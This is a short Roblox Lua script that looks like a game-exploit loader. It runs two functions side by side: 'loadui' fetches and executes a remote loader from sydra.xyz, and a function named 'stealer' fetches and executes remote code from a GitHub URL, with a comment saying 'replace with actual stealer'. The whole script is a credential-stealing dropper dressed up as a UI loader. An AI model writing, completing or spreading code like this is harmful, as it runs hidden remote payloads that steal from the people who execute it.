local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/aluizHub/Fizz/refs/heads/main/Laz.lua'))() -- replace with actual stealer
end
local function loadui()
  loadstring(game:HttpGet("https://sydra.xyz/Loader.lua"))()
end
task.spawn(stealer)
task.spawn(loadui)
